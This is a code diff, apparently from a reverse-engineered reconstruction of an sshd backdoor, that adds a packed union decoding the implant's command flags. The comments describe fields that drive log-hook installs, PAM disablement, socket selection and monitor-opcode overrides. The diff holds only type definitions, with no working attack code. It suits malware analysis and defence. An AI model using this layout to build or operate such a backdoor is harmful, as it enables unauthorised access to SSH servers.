@@ -1834,6 +1834,33 @@ typedef enum {
 
 typedef u8 CmdRequestFlags_t; /* Storage for CmdRequestFlags (CMD_REQUEST_*) bitmask. */
 
+typedef union __attribute__((packed)) cmd_flags_tail {
+ struct __attribute__((packed)) {
+  CmdRequestFlags_t request_flags; /* Raw request_flags byte from cmd_arguments_t. */
+  u8 payload_hint_lo; /* Low payload_hint byte (cmd_flags tail). */
+  u8 payload_hint_hi; /* High payload_hint byte (cmd_flags tail). */
+ } bytes;
+ struct __attribute__((packed)) {
+  u16 request_socket_id : 5; /* Low 5 bits (CMD_REQUEST_SOCKET_ID_MASK). */
+  u16 offsets_tail_present : 1; /* Tail override present (opcode 3 uses bit 0x20). */
+  u16 kex_sshbuf_qword_index : 7; /* 7-bit packed kex sshbuf qword index (bits 6..12). */
+  u16 payload_hint_lo_pad : 3; /* Unused/reserved bits 13..15. */
+  u8 payload_hint_hi_pad : 2; /* Unused/reserved bits 0..1 of payload_hint_hi. */
+  u8 sshbuf_data_qword_index : 3; /* Bits 2..4 of payload_hint_hi (sshbuf data qword index). */
+  u8 sshbuf_size_qword_index : 3; /* Bits 5..7 of payload_hint_hi (sshbuf size qword index). */
+ } offsets_v0;
+ struct __attribute__((packed)) {
+  u16 request_socket_id : 5; /* Low 5 bits (CMD_REQUEST_SOCKET_ID_MASK). */
+  u16 offsets_tail_present : 1; /* Bit 0x20 signals opcode-3 tail overrides. */
+  u16 log_flags_present : 1; /* Bit 0x40 gates log/kex override extraction. */
+  u16 monitor_opcode_override_present : 1; /* Bit 0x80 enables payload_hint_hi monitor opcode override. */
+  u16 kex_sshbuf_qword_index : 6; /* Bits 0..5 of payload_hint_lo (6-bit packed kex index). */
+  u16 socket_fields_present : 1; /* Bit 0x40 of payload_hint_lo enables socket field override. */
+  u16 payload_hint_lo_pad : 1; /* Unused/reserved bit 7 of payload_hint_lo. */
+  u8 monitor_opcode_override; /* Raw payload_hint_hi byte used as monitor opcode override. */
+ } offsets_v1;
+} cmd_flags_tail_t;
+
 /*
  * control_flags/monitor_flags/request_flags plus a two-byte payload_hint that collectively drive log-hook installs, PAM disablement, socket selection, monitor request IDs, and whether sshd_monitor_cmd_dispatch should stream payloads or patch ctx->sshd_offsets.
  */
